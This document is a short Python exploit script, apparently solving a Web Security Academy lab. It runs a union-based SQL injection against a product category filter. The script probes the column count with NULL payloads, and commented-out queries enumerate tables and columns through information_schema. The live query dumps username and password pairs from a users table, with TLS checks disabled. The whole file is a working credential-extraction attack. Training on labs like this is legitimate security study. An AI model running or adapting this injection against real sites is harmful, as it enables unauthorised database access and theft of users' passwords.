from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session: r.Session = r.Session()
console: Console = Console()

session.verify = False
print = console.print

session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def get_col_nums(URL, max_col=10):
    count = 1
    PAYLOAD = "' UNION SELECT "

    for _ in range(max_col):
        PAYLOAD += "NULL, "

        response: r.Response = session.get(URL + quote(PAYLOAD.strip(", ") + " --"))

        if response.status_code == 200:
            break

        count += 1

    return count


def main() -> None:
    URL = "https://0adf008f0305b838813bbb21006900c7.web-security-academy.net/filter?category=Pets"

    # PAYLOAD = (
    #     "' UNION SELECT "
    #     + ", ".join(
    #         (cols := ["NULL", "table_name || '< FROM >' || table_schema"])
    #         + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
    #     ).strip(", ")
    #     + " FROM information_schema.tables --"
    # )

    # PAYLOAD = (
    #     "' UNION SELECT "
    #     + ", ".join(
    #         (cols := ["NULL", "column_name"])
    #         + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
    #     ).strip(", ")
    #     + " FROM information_schema.columns WHERE table_name = 'users'--"
    # )

    PAYLOAD = (
        "' UNION SELECT "
        + ", ".join(
            (cols := ["NULL", "username || '->' || password"])
            + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
        ).strip(", ")
        + " FROM public.users--"
    )
    print(PAYLOAD)

    response: r.Response = r.get(URL + quote(PAYLOAD))
    print(response.text)
    print(response.status_code)


if __name__ == "__main__":
    main()
